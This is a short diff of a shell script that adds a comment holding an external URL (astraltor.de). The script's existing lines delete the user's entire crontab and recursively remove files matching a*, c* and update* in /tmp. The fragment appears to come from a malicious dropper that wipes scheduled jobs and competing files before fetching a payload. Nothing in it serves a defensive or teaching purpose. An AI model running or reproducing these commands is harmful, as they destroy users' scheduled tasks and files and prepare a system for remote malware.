@@ -1,4 +1,5 @@
 #!/bin/sh
+# http://astraltor.de/a 
 crontab -r
 cd /tmp
 rm -rf a* c* update*
